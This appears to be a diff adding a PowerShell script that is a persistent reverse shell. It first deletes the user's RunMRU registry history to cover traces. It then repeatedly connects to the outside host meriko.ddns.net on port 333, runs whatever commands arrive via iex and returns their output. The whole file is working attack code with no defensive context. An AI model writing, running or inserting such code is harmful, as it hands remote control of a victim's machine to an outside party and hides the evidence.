@@ -1,0 +1,19 @@
+$loopDelayMilliseconds = 30000
+
+
+
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+
+while ($true) {
+$startTime = Get-Date
+$client = New-Object System.Net.Sockets.TCPClient("meriko.ddns.net",333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
+$endTime = Get-Date
+$loopLength = ($endTime - $startTime).TotalMilliseconds
+$timeRemaining = $loopDelayMilliseconds - $loopLength
+ if($timeRemaining -gt 0)
+   {
+      Start-Sleep -Milliseconds $timeRemaining
+   }
+
+}
+
